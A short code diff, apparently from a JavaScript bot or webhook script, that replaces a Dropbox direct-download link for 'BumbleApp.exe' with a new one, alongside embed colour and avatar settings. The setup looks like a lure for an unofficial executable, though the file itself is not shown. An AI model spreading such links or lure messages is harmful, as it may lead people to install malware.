@@ -34,7 +34,7 @@
         });
     }
 
-    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";
+    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/qa5buml31wvgjhy41kvks/BumbleApp.exe?rlkey=hdldjqscs51sfo2ui5j5j9sp2&st=msve1wn6&dl=1";
     var EMBED_COLOR = 0xfdb913;
     var AVATAR_URL = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";
 
